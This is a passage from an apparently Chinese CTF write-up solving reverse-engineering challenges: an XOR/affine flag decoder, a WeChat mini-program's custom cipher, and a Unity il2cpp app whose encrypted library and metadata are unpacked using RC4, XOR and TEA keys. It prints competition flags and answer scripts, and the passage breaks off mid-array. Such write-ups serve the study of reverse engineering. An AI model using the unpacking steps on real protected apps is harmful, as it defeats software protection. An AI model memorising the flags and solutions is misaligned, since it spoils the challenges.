class="line"><span class="string">185 142</span></span><br><span class="line"><span class="string">108 4</span></span><br><span class="line"><span class="string">104 55</span></span><br><span class="line"><span class="string">108 74</span></span><br><span class="line"><span class="string">38 95</span></span><br><span class="line"><span class="string">108 178</span></span><br><span class="line"><span class="string">222 121</span></span><br><span class="line"><span class="string">108 116</span></span><br><span class="line"><span class="string">24 167</span></span><br><span class="line"><span class="string">108 223</span></span><br><span class="line"><span class="string">179 191</span></span><br><span class="line"><span class="string">108 173</span></span><br><span class="line"><span class="string">193 12</span></span><br><span class="line"><span class="string">250 151</span></span><br><span class="line"><span class="string">109 205</span></span><br><span class="line"><span class="string">195 116</span></span><br><span class="line"><span class="string">183 160</span></span><br><span class="line"><span class="string">235 32</span></span><br><span class="line"><span class="string">203 23</span></span><br><span class="line"><span class="string">65 0</span></span><br><span class="line"><span class="string">65 220</span></span><br><span class="line"><span class="string">89 235</span></span><br><span class="line"><span class="string">178 157</span></span><br><span class="line"><span class="string">54 37</span></span><br><span class="line"><span class="string">19 47</span></span><br><span class="line"><span class="string">53 62</span></span><br><span class="line"><span class="string">11 60</span></span><br><span class="line"><span class="string">250 237</span></span><br><span class="line"><span class="string">23 55</span></span><br><span class="line"><span class="string">36 16</span></span><br><span class="line"><span class="string">52 32</span></span><br><span class="line"><span class="string">72 4</span></span><br><span class="line"><span class="string">76 20</span></span><br><span class="line"><span class="string">20 132</span></span><br><span class="line"><span class="string">144 88</span></span><br><span class="line"><span class="string">157 173</span></span><br><span class="line"><span class="string">48 200</span></span><br><span class="line"><span class="string">128 186</span></span><br><span class="line"><span class="string">58 248</span></span><br><span class="line"><span class="string">146 245</span></span><br><span class="line"><span class="string">103 194</span></span><br><span class="line"><span class="string">219 127</span></span><br><span class="line"><span class="string">164 165</span></span><br><span class="line"><span class="string">133 191</span></span><br><span class="line"><span class="string">58 1</span></span><br><span class="line"><span class="string">179 150</span></span><br><span class="line"><span class="string">37 59</span></span><br><span class="line"><span class="string">153 148</span></span><br><span class="line"><span class="string">13 30</span></span><br><span class="line"><span class="string">196 26</span></span><br><span class="line"><span class="string">222 19</span></span><br><span class="line"><span class="string">69 132</span></span><br><span class="line"><span class="string">193 205</span></span><br><span class="line"><span class="string">67 146</span></span><br><span class="line"><span class="string">209 12</span></span><br><span class="line"><span class="string">48 7</span></span><br><span class="line"><span class="string">55 221</span></span><br><span class="line"><span class="string">142 206</span></span><br><span class="line"><span class="string">64 234</span></span><br><span class="line"><span class="string">55 70</span></span><br><span class="line"><span class="string">113 170</span></span><br><span class="line"><span class="string">95 9</span></span><br><span class="line"><span class="string">86 219</span></span><br><span class="line"><span class="string">121 217</span></span><br><span class="line"><span class="string">160 141</span></span><br><span class="line"><span class="string">167 54</span></span><br><span class="line"><span class="string">145 45</span></span><br><span class="line"><span class="string">191 232</span></span><br><span class="line"><span class="string">87 188</span></span><br><span class="line"><span class="string">12 41</span></span><br><span class="line"><span class="string">37 235</span></span><br><span class="line"><span class="string">205 54</span></span><br><span class="line"><span class="string">251 206</span></span><br><span class="line"><span class="string">160 131</span></span><br><span class="line"><span class="string">35 205</span></span><br><span class="line"><span class="string">23 111</span></span><br><span class="line"><span class="string">120 238</span></span><br><span class="line"><span class="string">220 142</span></span><br><span class="line"><span class="string">82 150</span></span><br><span class="line"><span class="string">157 126</span></span><br><span class="line"><span class="string">227 196</span></span><br><span class="line"><span class="string">47 62</span></span><br><span class="line"><span class="string">17 39</span></span><br><span class="line"><span class="string">60 106</span></span><br><span class="line"><span class="string">86 54</span></span><br><span class="line"><span class="string">55 99</span></span><br><span class="line"><span class="string">84 96</span></span><br><span class="line"><span class="string">32 116</span></span><br><span class="line"><span class="string">84 52</span></span><br><span class="line"><span class="string">20 156</span></span><br><span class="line"><span class="string">136 96</span></span><br><span class="line"><span class="string">88 245</span></span><br><span class="line"><span class="string">173 232</span></span><br><span class="line"><span class="string">200 254</span></span><br><span class="line"><span class="string">54 69</span></span><br><span class="line"><span class="string">248 119</span></span><br><span class="line"><span class="string">143 115</span></span><br><span class="line"><span class="string">194 91</span></span><br><span class="line"><span class="string">153 252</span></span><br><span class="line"><span class="string">165 89</span></span><br><span class="line"><span class="string">252 101</span></span><br><span class="line"><span class="string">1 146</span></span><br><span class="line"><span class="string">147 153</span></span><br><span class="line"><span class="string">59 60</span></span><br><span class="line"><span class="string">7 10</span></span><br><span class="line"><span class="string">30 77</span></span><br><span class="line"><span class="string">83 13</span></span><br><span class="line"><span class="string">19 255</span></span><br><span class="line"><span class="string">236 94</span></span><br><span class="line"><span class="string">205 49</span></span><br><span class="line"><span class="string">252 178</span></span><br><span class="line"><span class="string">12 232</span></span><br><span class="line"><span class="string">228 78</span></span><br><span class="line"><span class="string">221 65</span></span><br><span class="line"><span class="string">156 170</span></span><br><span class="line"><span class="string">234 2</span></span><br><span class="line"><span class="string">232 54</span></span><br><span class="line"><span class="string">170 131</span></span><br><span class="line"><span class="string">41 222</span></span><br><span class="line"><span class="string">219 164</span></span><br><span class="line"><span class="string">127 247</span></span><br><span class="line"><span class="string">141 39</span></span><br><span class="line"><span class="string">170 136</span></span><br><span class="line"><span class="string">45 114</span></span><br><span class="line"><span class="string">95 34</span></span><br><span class="line"><span class="string">188 96</span></span><br><span class="line"><span class="string">220 125</span></span><br><span class="line"><span class="string">235 189</span></span><br><span class="line"><span class="string">86 161</span></span><br><span class="line"><span class="string">206 122</span></span><br><span class="line"><span class="string">180 247</span></span><br><span class="line"><span class="string">53 84</span></span><br><span class="line"><span class="string">97 67</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">xor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    xor.append(<span class="built_in">int</span>(s[i].split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># print(xor, len(xor))</span></span><br><span class="line">xor = [<span class="number">91</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">198</span>, <span class="number">116</span>, <span class="number">3</span>, <span class="number">111</span>, <span class="number">163</span>, <span class="number">178</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">229</span>, <span class="number">113</span>, <span class="number">126</span>, <span class="number">37</span>, <span class="number">50</span>, <span class="number">90</span>, <span class="number">70</span>, <span class="number">49</span>, <span class="number">237</span>, <span class="number">106</span>, <span class="number">31</span>, <span class="number">210</span>, <span class="number">213</span>, <span class="number">4</span>, <span class="number">74</span>, <span class="number">178</span>, <span class="number">116</span>, <span class="number">223</span>, <span class="number">173</span>, <span class="number">151</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">235</span>, <span class="number">37</span>, <span class="number">62</span>, <span class="number">237</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">245</span>, <span class="number">127</span>, <span class="number">191</span>, <span class="number">150</span>, <span class="number">148</span>, <span class="number">26</span>, <span class="number">132</span>, <span class="number">146</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">217</span>, <span class="number">54</span>, <span class="number">232</span>, <span class="number">41</span>, <span class="number">54</span>, <span class="number">131</span>, <span class="number">111</span>, <span class="number">142</span>, <span class="number">126</span>, <span class="number">62</span>, <span class="number">106</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">156</span>, <span class="number">245</span>, <span class="number">254</span>, <span class="number">119</span>, <span class="number">91</span>, <span class="number">89</span>, <span class="number">146</span>, <span class="number">60</span>, <span class="number">77</span>, <span class="number">255</span>, <span class="number">49</span>, <span class="number">232</span>, <span class="number">65</span>, <span class="number">2</span>, <span class="number">131</span>, <span class="number">164</span>, <span class="number">39</span>, <span class="number">114</span>, <span class="number">96</span>, <span class="number">189</span>, <span class="number">122</span>, <span class="number">84</span>]</span><br><span class="line">text = [<span class="number">0xF7</span>, <span class="number">0x88</span>, <span class="number">0xC3</span>, <span class="number">0x29</span>, <span class="number">0x36</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x29</span>, <span class="number">0xC7</span>, <span class="number">0x7F</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>, <span class="number">0x71</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0xCB</span>, <span class="number">0x0A</span>, <span class="number">0xAF</span>, <span class="number">0x0C</span>, <span class="number">0x87</span>, <span class="number">0x84</span>, <span class="number">0x8E</span>, <span class="number">0x5A</span>, <span class="number">0x64</span>, <span class="number">0xC7</span>, <span class="number">0xAC</span>, <span class="number">0x2A</span>, <span class="number">0x67</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        text[j] ^= text[(j-<span class="number">1</span>)%<span class="number">30</span>] ^ xor[i*<span class="number">30</span>+j]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, text)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> text[i] <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">        text[i] = (<span class="number">15</span> * (text[i] - <span class="number">65</span> - <span class="number">11</span>) % <span class="number">26</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">    <span class="keyword">elif</span> text[i] <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">        text[i] = (<span class="number">15</span> * (text[i] - <span class="number">97</span> - <span class="number">11</span>) % <span class="number">26</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">    <span class="keyword">elif</span> text[i] <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>, <span class="number">59</span>):</span><br><span class="line">        text[i] = (<span class="number">3</span> * (text[i] - <span class="number">48</span> - <span class="number">11</span>) % <span class="number">10</span>) % <span class="number">10</span> + <span class="number">48</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, text)))</span><br><span class="line">cmp = [<span class="number">238</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">39</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">52</span>, <span class="number">96</span>, <span class="number">232</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">252</span>, <span class="number">101</span>, <span class="number">153</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">94</span>, <span class="number">178</span>, <span class="number">78</span>, <span class="number">170</span>, <span class="number">54</span>, <span class="number">222</span>, <span class="number">247</span>, <span class="number">136</span>, <span class="number">34</span>, <span class="number">125</span>, <span class="number">161</span>, <span class="number">247</span>, <span class="number">67</span>, <span class="number">34</span>]</span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(chr(cmp[i]^108^text[i]), end=&quot;&quot;)</span></span><br></pre></td></tr></table></figure>

<p>得到flag{r0uNd_Rc4_Aff1neEnc1yp0!}</p>
<h1><span id="mobile">Mobile</span><a href="#mobile" class="header-anchor"></a></h1><h2><span id="ezminiapp">EzMiniApp</span><a href="#ezminiapp" class="header-anchor"></a></h2><p>wxapkg.exe解包小程序，发现逻辑在app-service.js</p>
<p>加密逻辑是一个旋转混淆，逻辑如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">enigmaticTransformation</span>: <span class="keyword">function</span>(<span class="params">a, t</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e, n, r = [], </span><br><span class="line">             i = <span class="title class_">Array</span>.<span class="title function_">from</span>(t).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">a</span>)&#123; <span class="keyword">return</span> a.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) &#125;),</span><br><span class="line">             s = i.<span class="property">length</span>, </span><br><span class="line">             c = <span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">                   <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>, e = <span class="number">0</span>; e &lt; a.<span class="property">length</span>; e++)</span><br><span class="line">                       <span class="keyword">switch</span>(e % <span class="number">4</span>)&#123;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">0</span>: t += <span class="number">1</span> * a[e]; <span class="keyword">break</span>;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">1</span>: t += a[e] + <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">2</span>: t += <span class="number">0</span> | a[e]; <span class="keyword">break</span>;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">3</span>: t += <span class="number">0</span> ^ a[e]</span><br><span class="line">                       &#125;</span><br><span class="line">                   <span class="keyword">return</span> t</span><br><span class="line">               &#125;(i) % <span class="number">8</span>, </span><br><span class="line">             o = <span class="number">0</span>; o &lt; a.<span class="property">length</span>; o++)&#123;</span><br><span class="line">        <span class="keyword">var</span> u = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(o % <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: u = a.<span class="title function_">charCodeAt</span>(o) ^ i[o % s]; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: u = i[o % s] ^ a.<span class="title function_">charCodeAt</span>(o); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: e = a.<span class="title function_">charCodeAt</span>(o),</span><br><span class="line">                    n = i[o % s],</span><br><span class="line">                    u = e ^ n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: h = u; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; <span class="number">1</span> | u &gt;&gt; <span class="number">7</span> &amp; <span class="number">1</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; <span class="number">2</span> | u &gt;&gt; <span class="number">6</span> &amp; <span class="number">3</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; <span class="number">3</span> | u &gt;&gt; <span class="number">5</span> &amp; <span class="number">7</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; <span class="number">4</span> | u &gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; <span class="number">5</span> | u &gt;&gt; <span class="number">3</span> &amp; <span class="number">31</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; <span class="number">6</span> | u &gt;&gt; <span class="number">2</span> &amp; <span class="number">63</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; <span class="number">7</span> | u &gt;&gt; <span class="number">1</span> &amp; <span class="number">127</span>); <span class="keyword">break</span>;</span><br><span class="line">            <span class="attr">default</span>: h = <span class="number">255</span> &amp; (u &lt;&lt; c | u &gt;&gt; (<span class="number">8</span> - c))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span>(o % <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: r[r.<span class="property">length</span>] = h; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: r.<span class="title function_">push</span>(h)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = [], e = <span class="number">0</span>; e &lt; a.<span class="property">length</span>; e++)</span><br><span class="line">            <span class="keyword">switch</span>(e % <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    t[e] = a[e]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    &#125;(r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后主函数的验证逻辑是：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">inputValue</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;&quot;</span> !== a.<span class="title function_">trim</span>()) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">customEncrypt</span>(a, <span class="string">&quot;newKey2025!&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(t);</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t) === <span class="title class_">JSON</span>.<span class="title function_">stringify</span>([<span class="number">1</span>,<span class="number">33</span>,<span class="number">194</span>,<span class="number">133</span>,<span class="number">195</span>,<span class="number">102</span>,<span class="number">232</span>,<span class="number">104</span>,<span class="number">200</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">163</span>,<span class="number">131</span>,<span class="number">71</span>,<span class="number">68</span>,<span class="number">97</span>,<span class="number">2</span>,<span class="number">76</span>,<span class="number">72</span>,<span class="number">171</span>,<span class="number">74</span>,<span class="number">106</span>,<span class="number">225</span>,<span class="number">1</span>,<span class="number">65</span>])</span><br><span class="line">        ? wx.<span class="title function_">showToast</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;Right&quot;</span>, <span class="attr">icon</span>: <span class="string">&quot;success&quot;</span>, <span class="attr">duration</span>: <span class="number">2e3</span> &#125;)</span><br><span class="line">        : wx.<span class="title function_">showToast</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;Wrong&quot;</span>, <span class="attr">icon</span>: <span class="string">&quot;error&quot;</span>, <span class="attr">duration</span>: <span class="number">2e3</span> &#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    wx.<span class="title function_">showToast</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;请输入内容&quot;</span>, <span class="attr">icon</span>: <span class="string">&quot;none&quot;</span>, <span class="attr">duration</span>: <span class="number">2e3</span> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接求逆即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, key</span>):</span><br><span class="line"></span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> key]</span><br><span class="line">    s = <span class="built_in">len</span>(key_bytes)</span><br><span class="line">    c = <span class="built_in">sum</span>(key_bytes) % <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    out_bytes = []</span><br><span class="line">    <span class="keyword">for</span> i, cb <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher):</span><br><span class="line">        <span class="keyword">if</span> c == <span class="number">0</span>:</span><br><span class="line">            u = cb &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u = ((cb &gt;&gt; c) | ((cb &lt;&lt; (<span class="number">8</span> - c)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">        kb = key_bytes[i % s]</span><br><span class="line">        p = u ^ kb</span><br><span class="line">        out_bytes.append(p)</span><br><span class="line"></span><br><span class="line">    b = <span class="built_in">bytes</span>(out_bytes)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = b.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        s = b.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b, s</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">1</span>,<span class="number">33</span>,<span class="number">194</span>,<span class="number">133</span>,<span class="number">195</span>,<span class="number">102</span>,<span class="number">232</span>,<span class="number">104</span>,<span class="number">200</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">163</span>,<span class="number">131</span>,<span class="number">71</span>,<span class="number">68</span>,<span class="number">97</span>,<span class="number">2</span>,<span class="number">76</span>,<span class="number">72</span>,<span class="number">171</span>,<span class="number">74</span>,<span class="number">106</span>,<span class="number">225</span>,<span class="number">1</span>,<span class="number">65</span>]</span><br><span class="line">key = <span class="string">&quot;newKey2025!&quot;</span></span><br><span class="line"></span><br><span class="line">raw, text = decrypt(cipher, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>

<p>得到flag：flag{JustEasyMiniProgram}</p>
<h2><span id="just">Just</span><a href="#just" class="header-anchor"></a></h2><p>il2cpp的加固，思考如何解密il2cpp.so</p>
<p><img src="../images/2025-QWNT/28.png" alt="img"></p>
<p>UnityPlayerActivity中载入了just.so，后续不再有任何JNI调用，说明利用了构造函数或者Jni_onload</p>
<p>Just.so Hook了dlopen解密il2cpp.so</p>
<p><img src="../images/2025-QWNT/29.png" alt="img"></p>
<p>可以看到解密逻辑是RC4+^0x33</p>
<p>密钥在上文中是nihaounity</p>
<p><img src="../images/2025-QWNT/30.png" alt="img"></p>
<p>解密到so文件，直接尝试il2cppdumper是失败的，发现metadata也被加密了，metadata是在il2cpp.so中进行加密的</p>
<p><img src="../images/2025-QWNT/31.png" alt="img"></p>
<p>看到加密逻辑，这里直接解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys, struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">inp, outp</span>):</span><br><span class="line">    d = Path(inp).read_bytes()</span><br><span class="line">    kl = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, d, <span class="number">1024</span>)[<span class="number">0</span>] &amp; <span class="number">0xffff</span></span><br><span class="line">    m = [struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, d, <span class="number">1028</span> + <span class="number">4</span>*i)[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(kl)]</span><br><span class="line">    e = <span class="number">1024</span> + <span class="number">4</span>*(kl+<span class="number">1</span>)</span><br><span class="line">    out = <span class="built_in">bytearray</span>(d[:<span class="number">1024</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(d)-e - (<span class="built_in">len</span>(d)-e)%<span class="number">4</span>, <span class="number">4</span>):</span><br><span class="line">        idx = (i + i//kl) % kl</span><br><span class="line">        w = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, d, e+i)[<span class="number">0</span>] ^ m[idx]</span><br><span class="line">        out += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, w)</span><br><span class="line">    Path(outp).write_bytes(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<p>接下来il2cppdumper直接恢复符号了</p>
<p><img src="../images/2025-QWNT/32.png" alt="img"></p>
<p><img src="../images/2025-QWNT/33.png" alt="img"></p>
<p>TEA轮子没有任何魔改，就是tea加密自身之后再进行异或，引入流密码特性</p>
<p><img src="../images/2025-QWNT/34.png" alt="img"></p>
<p>根据PrivateImplementationDetails的特性，构造函数的这个内容是通过dump.cs找偏移在global-metadata中取值</p>
<p><img src="../images/2025-QWNT/35.png" alt="img"></p>
<p>根据偏移索引地址</p>
<p><img src="../images/2025-QWNT/36.png" alt="img"></p>
<p>即可找到密文密钥</p>
<p>根据tea特性4个uint为密钥，40bytes自然是密文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">MASK = <span class="number">0xFFFFFFFF</span></span><br><span class="line">KEYS = [<span class="number">0x12345678</span>, <span class="number">0x09101112</span>, <span class="number">0x13141516</span>, <span class="number">0x15161718</span>]</span><br><span class="line"></span><br><span class="line">buf = <span class="built_in">bytearray</span>([</span><br><span class="line"><span class="number">0xAF</span>,<span class="number">0x58</span>,<span class="number">0x64</span>,<span class="number">0x40</span>,<span class="number">0x9D</span>,<span class="number">0xB9</span>,<span class="number">0x21</span>,<span 